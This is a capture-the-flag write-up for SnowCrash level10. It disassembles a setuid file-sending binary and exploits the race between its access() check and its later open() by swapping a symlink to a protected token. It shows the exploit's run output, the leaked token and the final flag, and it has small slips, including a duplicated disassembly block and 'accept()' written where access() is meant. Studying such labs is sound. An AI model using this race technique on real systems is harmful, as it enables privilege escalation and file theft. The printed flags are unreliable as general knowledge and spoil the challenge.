# level10

## Recognition

There is a level11 script which is owned by flag10, and a token file also owned by flag10 which is not readable.
```bash
level10@SnowCrash:~$ ls -l
total 28
-rwsr-sr-x+ 1 flag10  level10 10817 Mar  5  2016 level10
-rw-------  1 flag10  flag10     26 Mar  5  2016 token
```

The program sends a file to a specified host if the user have access to the file. 
```bash
level10@SnowCrash:~$ ./level10
./level10 file host
	sends file to host if you have access to it
```

When sending a file to an invalid host, it shows that it tries to connect on port 6969.
```bash
level10@SnowCrash:~$ ./level10 file 127.0.0.1
Connecting to 127.0.0.1:6969 .. Unable to connect to host 127.0.0.1
```

When looking to the .rodata section of the program, we can see a bunch of log strings that dont seem that much usefull for exploiting.
```bash
level10@SnowCrash:~$ readelf -x .rodata level10

Hex dump of section '.rodata':
  0x08048a38 03000000 01000200 25732066 696c6520 ........%s file
  0x08048a48 686f7374 0a097365 6e647320 66696c65 host..sends file
  0x08048a58 20746f20 686f7374 20696620 796f7520  to host if you
  0x08048a68 68617665 20616363 65737320 746f2069 have access to i
  0x08048a78 740a0043 6f6e6e65 6374696e 6720746f t..Connecting to
  0x08048a88 2025733a 36393639 202e2e20 00556e61  %s:6969 .. .Una
  0x08048a98 626c6520 746f2063 6f6e6e65 63742074 ble to connect t
  0x08048aa8 6f20686f 73742025 730a002e 2a282029 o host %s...*( )
  0x08048ab8 2a2e0a00 556e6162 6c652074 6f207772 *...Unable to wr
  0x08048ac8 69746520 62616e6e 65722074 6f20686f ite banner to ho
  0x08048ad8 73742025 730a0043 6f6e6e65 63746564 st %s..Connected
  0x08048ae8 210a5365 6e64696e 67206669 6c65202e !.Sending file .
  0x08048af8 2e200044 616d6e2e 20556e61 626c6520 . .Damn. Unable
  0x08048b08 746f206f 70656e20 66696c65 00556e61 to open file.Una
  0x08048b18 626c6520 746f2072 65616420 66726f6d ble to read from
  0x08048b28 2066696c 653a2025 730a0077 726f7465  file: %s..wrote
  0x08048b38 2066696c 65210059 6f752064 6f6e2774  file!.You don't
  0x08048b48 20686176 65206163 63657373 20746f20  have access to
  0x08048b58 25730a00                            %s..
```

Though when looking at the disassembled code in <main> we can see that the program uses the `accept()` call for checking file permissions, which is subject to a race condition vulnerability.
```bash
level10@SnowCrash:~$ objdump -M intel -D level10
[...]
080486d4 <main>:
 80486d4:       55                      push   ebp
 80486d5:       89 e5                   mov    ebp,esp
 80486d7:       83 e4 f0                and    esp,0xfffffff0
 80486da:       81 ec 50 10 00 00       sub    esp,0x1050
 80486e0:       8b 45 0c                mov    eax,DWORD PTR [ebp+0xc]
 80486e3:       89 44 24 1c             mov    DWORD PTR [esp+0x1c],eax
 80486e7:       65 a1 14 00 00 00       mov    eax,gs:0x14
 80486ed:       89 84 24 4c 10 00 00    mov    DWORD PTR [esp+0x104c],eax
 80486f4:       31 c0                   xor    eax,eax
 80486f6:       83 7d 08 02             cmp    DWORD PTR [ebp+0x8],0x2
 80486fa:       7f 23                   jg     804871f <main+0x4b>
 80486fc:       8b 44 24 1c             mov    eax,DWORD PTR [esp+0x1c]
 8048700:       8b 10                   mov    edx,DWORD PTR [eax]
 8048702:       b8 40 8a 04 08          mov    eax,0x8048a40        // address of "%s file host"
 8048707:       89 54 24 04             mov    DWORD PTR [esp+0x4],edx
 804870b:       89 04 24                mov    DWORD PTR [esp],eax
 804870e:       e8 0d fe ff ff          call   8048520 <printf@plt>
 8048713:       c7 04 24 01 00 00 00    mov    DWORD PTR [esp],0x1
 804871a:       e8 71 fe ff ff          call   8048590 <exit@plt>
 804871f:       8b 44 24 1c             mov    eax,DWORD PTR [esp+0x1c]
 8048723:       8b 40 04                mov    eax,DWORD PTR [eax+0x4]
 8048726:       89 44 24 28             mov    DWORD PTR [esp+0x28],eax
 804872a:       8b 44 24 1c             mov    eax,DWORD PTR [esp+0x1c]
 804872e:       8b 40 08                mov    eax,DWORD PTR [eax+0x8]
 8048731:       89 44 24 2c             mov    DWORD PTR [esp+0x2c],eax
 8048735:       8b 44 24 1c             mov    eax,DWORD PTR [esp+0x1c]
 8048739:       83 c0 04                add    eax,0x4
 804873c:       8b 00                   mov    eax,DWORD PTR [eax]
 804873e:       c7 44 24 04 04 00 00    mov    DWORD PTR [esp+0x4],0x4
 8048745:       00
 8048746:       89 04 24                mov    DWORD PTR [esp],eax
 8048749:       e8 92 fe ff ff          call   80485e0 <access@plt>
 804874e:       85 c0                   test   eax,eax
 8048750:       0f 85 ea 01 00 00       jne    8048940 <main+0x26c>
 8048756:       b8 7b 8a 04 08          mov    eax,0x8048a7b    // address of "Connecting to %s:6969"
 804875b:       8b 54 24 2c             mov    edx,DWORD PTR [esp+0x2c]
 804875f:       89 54 24 04             mov    DWORD PTR [esp+0x4],edx
 8048763:       89 04 24                mov    DWORD PTR [esp],eax
 8048766:       e8 b5 fd ff ff          call   8048520 <printf@plt>
 804876b:       a1 60 a0 04 08          mov    eax,ds:0x804a060
 8048770:       89 04 24                mov    DWORD PTR [esp],eax
 8048773:       e8 b8 fd ff ff          call   8048530 <fflush@plt>
 8048778:       c7 44 24 08 00 00 00    mov    DWORD PTR [esp+0x8],0x0
 804877f:       00
 8048780:       c7 44 24 04 01 00 00    mov    DWORD PTR [esp+0x4],0x1
 8048787:       00
 8048788:       c7 04 24 02 00 00 00    mov    DWORD PTR [esp],0x2
 804878f:       e8 5c fe ff ff          call   80485f0 <socket@plt>
 8048794:       89 44 24 30             mov    DWORD PTR [esp+0x30],eax
 8048798:       8d 84 24 3c 10 00 00    lea    eax,[esp+0x103c]
 804879f:       c7 00 00 00 00 00       mov    DWORD PTR [eax],0x0
 80487a5:       c7 40 04 00 00 00 00    mov    DWORD PTR [eax+0x4],0x0
 80487ac:       c7 40 08 00 00 00 00    mov    DWORD PTR [eax+0x8],0x0
 80487b3:       c7 40 0c 00 00 00 00    mov    DWORD PTR [eax+0xc],0x0
 80487ba:       66 c7 84 24 3c 10 00    mov    WORD PTR [esp+0x103c],0x2
 80487c1:       00 02 00
 80487c4:       8b 44 24 2c             mov    eax,DWORD PTR [esp+0x2c]
 80487c8:       89 04 24                mov    DWORD PTR [esp],eax
 80487cb:       e8 30 fe ff ff          call   8048600 <inet_addr@plt>
 80487d0:       89 84 24 40 10 00 00    mov    DWORD PTR [esp+0x1040],eax
 80487d7:       c7 04 24 39 1b 00 00    mov    DWORD PTR [esp],0x1b39
 80487de:       e8 6d fd ff ff          call   8048550 <htons@plt>
 80487e3:       66 89 84 24 3e 10 00    mov    WORD PTR [esp+0x103e],ax
 80487ea:       00
 80487eb:       c7 44 24 08 10 00 00    mov    DWORD PTR [esp+0x8],0x10
 80487f2:       00
 80487f3:       8d 84 24 3c 10 00 00    lea    eax,[esp+0x103c]
 80487fa:       89 44 24 04             mov    DWORD PTR [esp+0x4],eax
 80487fe:       8b 44 24 30             mov    eax,DWORD PTR [esp+0x30]
 8048802:       89 04 24                mov    DWORD PTR [esp],eax
 8048805:       e8 06 fe ff ff          call   8048610 <connect@plt>
 804880a:       83 f8 ff                cmp    eax,0xffffffff
 804880d:       75 21                   jne    8048830 <main+0x15c>
 804880f:       b8 95 8a 04 08          mov    eax,0x8048a95    // address of "Unable to connect to host %s"
 8048814:       8b 54 24 2c             mov    edx,DWORD PTR [esp+0x2c]
 8048818:       89 54 24 04             mov    DWORD PTR [esp+0x4],edx
 804881c:       89 04 24                mov    DWORD PTR [esp],eax
 804881f:       e8 fc fc ff ff          call   8048520 <printf@plt>
 8048824:       c7 04 24 01 00 00 00    mov    DWORD PTR [esp],0x1
 804882b:       e8 60 fd ff ff          call   8048590 <exit@plt>
 8048830:       c7 44 24 08 08 00 00    mov    DWORD PTR [esp+0x8],0x8
 8048837:       00
 8048838:       c7 44 24 04 b3 8a 04    mov    DWORD PTR [esp+0x4],0x8048ab3    // address of "*( )*"
 804883f:       08
 8048840:       8b 44 24 30             mov    eax,DWORD PTR [esp+0x30]
 8048844:       89 04 24                mov    DWORD PTR [esp],eax
 8048847:       e8 74 fd ff ff          call   80485c0 <write@plt>
 804884c:       83 f8 ff                cmp    eax,0xffffffff
 804884f:       75 21                   jne    8048872 <main+0x19e>
 8048851:       b8 bc 8a 04 08          mov    eax,0x8048abc    // address of "Unable to write banner to host %s"
 8048856:       8b 54 24 2c             mov    edx,DWORD PTR [esp+0x2c]
 804885a:       89 54 24 04             mov    DWORD PTR [esp+0x4],edx
 804885e:       89 04 24                mov    DWORD PTR [esp],eax
 8048861:       e8 ba fc ff ff          call   8048520 <printf@plt>
 8048866:       c7 04 24 01 00 00 00    mov    DWORD PTR [esp],0x1
 804886d:       e8 1e fd ff ff          call   8048590 <exit@plt>
 8048872:       b8 df 8a 04 08          mov    eax,0x8048adf    // address of "Connected !"
 8048877:       89 04 24                mov    DWORD PTR [esp],eax
 804887a:       e8 a1 fc ff ff          call   8048520 <printf@plt>
 804887f:       a1 60 a0 04 08          mov    eax,ds:0x804a060
 8048884:       89 04 24                mov    DWORD PTR [esp],eax
 8048887:       e8 a4 fc ff ff          call   8048530 <fflush@plt>
 804888c:       c7 44 24 04 00 00 00    mov    DWORD PTR [esp+0x4],0x0
 8048893:       00
 8048894:       8b 44 24 28             mov    eax,DWORD PTR [esp+0x28]
 8048898:       89 04 24                mov    DWORD PTR [esp],eax
 804889b:       e8 00 fd ff ff          call   80485a0 <open@plt>
 80488a0:       89 44 24 34             mov    DWORD PTR [esp+0x34],eax
 80488a4:       83 7c 24 34 ff          cmp    DWORD PTR [esp+0x34],0xffffffff
 80488a9:       75 18                   jne    80488c3 <main+0x1ef>
 80488ab:       c7 04 24 fb 8a 04 08    mov    DWORD PTR [esp],0x8048afb    // address of "Damn. Unable to open file."
 80488b2:       e8 a9 fc ff ff          call   8048560 <puts@plt>
 80488b7:       c7 04 24 01 00 00 00    mov    DWORD PTR [esp],0x1
 80488be:       e8 cd fc ff ff          call   8048590 <exit@plt>
 804887a:       e8 a1 fc ff ff          call   8048520 <printf@plt>
 804887f:       a1 60 a0 04 08          mov    eax,ds:0x804a060
 8048884:       89 04 24                mov    DWORD PTR [esp],eax
 8048887:       e8 a4 fc ff ff          call   8048530 <fflush@plt>
 804888c:       c7 44 24 04 00 00 00    mov    DWORD PTR [esp+0x4],0x0
 8048893:       00
 8048894:       8b 44 24 28             mov    eax,DWORD PTR [esp+0x28]
 8048898:       89 04 24                mov    DWORD PTR [esp],eax
 804889b:       e8 00 fd ff ff          call   80485a0 <open@plt>
 80488a0:       89 44 24 34             mov    DWORD PTR [esp+0x34],eax
 80488a4:       83 7c 24 34 ff          cmp    DWORD PTR [esp+0x34],0xffffffff
 80488a9:       75 18                   jne    80488c3 <main+0x1ef>
 80488ab:       c7 04 24 fb 8a 04 08    mov    DWORD PTR [esp],0x8048afb    // address of "Damn. Unable to open file."
 80488b2:       e8 a9 fc ff ff          call   8048560 <puts@plt>
 80488b7:       c7 04 24 01 00 00 00    mov    DWORD PTR [esp],0x1
 80488be:       e8 cd fc ff ff          call   8048590 <exit@plt>
 80488c3:       c7 44 24 08 00 10 00    mov    DWORD PTR [esp+0x8],0x1000
 80488ca:       00
 80488cb:       8d 44 24 3c             lea    eax,[esp+0x3c]
 80488cf:       89 44 24 04             mov    DWORD PTR [esp+0x4],eax
 80488d3:       8b 44 24 34             mov    eax,DWORD PTR [esp+0x34]
 80488d7:       89 04 24                mov    DWORD PTR [esp],eax
 80488da:       e8 31 fc ff ff          call   8048510 <read@plt>
 80488df:       89 44 24 38             mov    DWORD PTR [esp+0x38],eax
 80488e3:       83 7c 24 38 ff          cmp    DWORD PTR [esp+0x38],0xffffffff
 80488e8:       75 2c                   jne    8048916 <main+0x242>
 80488ea:       e8 e1 fc ff ff          call   80485d0 <__errno_location@plt>
 80488ef:       8b 00                   mov    eax,DWORD PTR [eax]
 80488f1:       89 04 24                mov    DWORD PTR [esp],eax
 80488f4:       e8 77 fc ff ff          call   8048570 <strerror@plt>
 80488f9:       ba 15 8b 04 08          mov    edx,0x8048b15    // address of "Unable to read from file: %s"
 80488fe:       89 44 24 04             mov    DWORD PTR [esp+0x4],eax
 8048902:       89 14 24                mov    DWORD PTR [esp],edx
 8048905:       e8 16 fc ff ff          call   8048520 <printf@plt>
 804890a:       c7 04 24 01 00 00 00    mov    DWORD PTR [esp],0x1
 8048911:       e8 7a fc ff ff          call   8048590 <exit@plt>
 8048916:       8b 44 24 38             mov    eax,DWORD PTR [esp+0x38]
 804891a:       89 44 24 08             mov    DWORD PTR [esp+0x8],eax
 804891e:       8d 44 24 3c             lea    eax,[esp+0x3c]
 8048922:       89 44 24 04             mov    DWORD PTR [esp+0x4],eax
 8048926:       8b 44 24 30             mov    eax,DWORD PTR [esp+0x30]
 804892a:       89 04 24                mov    DWORD PTR [esp],eax
 804892d:       e8 8e fc ff ff          call   80485c0 <write@plt>
 8048932:       c7 04 24 33 8b 04 08    mov    DWORD PTR [esp],0x8048b33 // address of "wrote file !"
 8048939:       e8 22 fc ff ff          call   8048560 <puts@plt>
 804893e:       eb 15                   jmp    8048955 <main+0x281>
 8048940:       b8 3f 8b 04 08          mov    eax,0x8048b3f   // address of "You dont have access to %s"
 8048945:       8b 54 24 28             mov    edx,DWORD PTR [esp+0x28]
 8048949:       89 54 24 04             mov    DWORD PTR [esp+0x4],edx
 804894d:       89 04 24                mov    DWORD PTR [esp],eax
 8048950:       e8 cb fb ff ff          call   8048520 <printf@plt>
 8048955:       8b 94 24 4c 10 00 00    mov    edx,DWORD PTR [esp+0x104c]
 804895c:       65 33 15 14 00 00 00    xor    edx,DWORD PTR gs:0x14
 8048963:       74 05                   je     804896a <main+0x296>
 8048965:       e8 d6 fb ff ff          call   8048540 <__stack_chk_fail@plt>
 804896a:       c9                      leave
[...]
```
</br>
</br>

## Exploitation

As we can see in the disassembled code, the use of the `access` call is really badly handled. Indeed the `open` call relating to the filepath checked is called after the creation and connection of the socket to the server.

We can use that to our advantage, by creating a symlink to a file we own, then letting the program call `access` on it to pass the privilege guard, then by writing a server that will controll the `accept` behaviour of the client, we can swap the symlink target to the 'token' file at the right time after the `access` call, but before it opens it.

The program will then simply send the file contents to the server listener.

We used [this](./resources/exploit.c) exploit that we wrote in C.
```bash
level10@SnowCrash:/tmp$ gcc -pthread exploit.c -o exploit
level10@SnowCrash:/tmp$ chmod +rwx $HOME
level10@SnowCrash:/tmp$ mv exploit $HOME/exploit
level10@SnowCrash:/tmp$ cd
level10@SnowCrash:~$ ./exploit
create fake file
create symlink
forking process
starting server
waiting response from executable
waiting for semaphore in child
starting executable
Connecting to 127.0.0.1:6969 .. client tries connecting
removing symlink
swapping symlink
Connected!
received message:
.*( )*.

Sending file .. wrote file!
received message:
woupa2yuojeeaaed06riuj63c

Killed
```

We can then log as user flag10 and run the `getflag` command
```bash
flag10@SnowCrash:~$ getflag
Check flag.Here is your token : feulo4b72j7edeahuete3no7c
```